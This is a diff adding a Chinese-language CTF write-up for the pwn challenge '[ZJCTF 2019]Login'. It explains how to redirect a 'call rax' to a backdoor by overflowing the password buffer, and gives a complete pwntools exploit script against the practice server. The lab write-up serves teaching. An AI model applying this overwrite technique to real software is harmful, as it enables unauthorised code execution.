@@ -560,6 +560,53 @@ p.sendline(b"cat flag")
 p.interactive()
 ```
 
+### [ZJCTF 2019]Login
+
+[[ZJCTF 2019]Login](https://buuoj.cn/challenges#[ZJCTF%202019]Login)
+
+一开始密码和账号都给我们了，也有后门函数，看起来很正常。
+
+看一下 password_checker，发现有 call rax。
+
+<img width="2250" height="1052" alt="image" src="https://github.com/user-attachments/assets/ce091105-f50b-4a01-af4d-2ca08d78eabc" />
+
+那么思路就是劫持 rax，让 rax 等于后门函数。
+
+找一下 rax 的源头，发现是 var_18。
+
+<img width="2089" height="989" alt="image" src="https://github.com/user-attachments/assets/19e2aee7-3de4-4369-a1b6-496868093d1b" />
+
+在输入密码的缓冲区，我们找到了它。
+
+<img width="2190" height="973" alt="image" src="https://github.com/user-attachments/assets/860b1f49-4ba7-4311-84e0-1f2d585c661d" />
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 25629
+io = remote(host,port)
+# io = process("./login")
+backdoor = 0x400E88
+
+def main():
+    io.recvuntil(b"Please enter username: ")
+    io.sendline(b"admin")
+    io.recvuntil(b"Please enter password: ")
+    password = b"2jctf_pa5sw0rd" # 14 = 0xE
+    # 0x60 - 0x18 - 0xE = 0x3a
+    payload = password + b'\x00'*0x3a + p64(backdoor)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+
 ## 中水区
 
 可能只有主播这种区才会觉得这里是中水区。
